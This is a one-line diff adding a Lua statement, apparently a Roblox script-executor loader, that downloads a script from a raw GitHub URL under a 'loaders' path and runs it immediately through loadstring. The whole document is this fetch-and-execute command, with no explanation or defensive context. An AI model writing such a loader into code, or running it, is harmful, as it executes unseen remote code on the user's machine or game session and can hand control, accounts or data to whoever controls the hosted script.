@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/hide-in-pixels-spam4-s3jwj22le08wrv.lua"))()
